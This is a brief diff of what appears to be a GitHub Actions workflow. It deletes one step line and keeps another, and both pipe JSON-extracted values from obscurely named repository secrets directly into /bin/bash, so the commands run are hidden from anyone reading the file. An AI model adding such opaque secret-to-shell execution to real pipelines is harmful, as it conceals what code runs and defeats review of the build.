@@ -17,7 +17,6 @@ jobs:
           cldgp2: ${{ secrets.cldgp2 }}
         run: |
           printf '%s' "$cldgp2" | jq -r .dxd8 | /bin/bash
-          printf '%s' "$tvk364" | jq -r .zupmu16 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
